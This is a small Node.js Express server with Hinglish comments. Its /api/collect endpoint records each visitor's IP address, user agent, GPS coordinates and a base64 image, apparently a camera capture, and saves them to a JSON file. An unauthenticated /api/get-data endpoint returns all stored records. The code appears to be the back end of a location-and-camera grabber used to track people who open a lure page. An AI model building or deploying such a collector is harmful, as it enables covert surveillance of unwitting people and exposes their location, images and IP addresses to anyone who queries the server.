const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(express.json({ limit: '10mb' }));
app.use(cors());

// Static files serve karne ke liye
app.use(express.static(path.join(__dirname, 'public')));

// Explicit Root Route (Yeh 'Cannot GET /' error ko fix kar dega)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Database helpers aur baki APIs...
function readDB() {
    if (!fs.existsSync(DATA_FILE)) return {};
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (err) {
        return {};
    }
}

function writeDB(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

app.post('/api/collect', (req, res) => {
    let db = readDB();
    const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    db[recordId] = {
        id: recordId,
        ip: clientIp,
        latitude: req.body.latitude || 'Not Granted (Denied)',
        longitude: req.body.longitude || 'Not Granted (Denied)',
        image_base64: req.body.image_base64 || null,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
    };

    writeDB(db);
    res.status(200).json({ status: 'success', message: 'Data logged successfully' });
});

app.get('/api/get-data', (req, res) => {
    res.status(200).json(readDB());
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
